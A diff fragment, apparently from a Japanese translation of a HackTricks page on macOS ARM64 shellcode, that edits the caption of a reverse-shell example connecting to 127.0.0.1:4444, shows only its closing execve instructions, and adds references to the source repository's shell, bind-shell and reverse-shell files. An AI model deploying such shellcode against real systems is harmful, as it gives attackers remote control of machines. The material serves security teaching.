-出典: [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell to **127.0.0.1:4444**
+[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)より、**127.0.0.1:4444**へrevshell<sup>[3]</sup>。
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -776,4 +777,10 @@ mov  x2, xzr
 mov  x16, #59
 svc  #0x1337
 ```
+## 参考文献
+
+- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
+- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
+- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
+
 {{#include ../../../banners/hacktricks-training.md}}
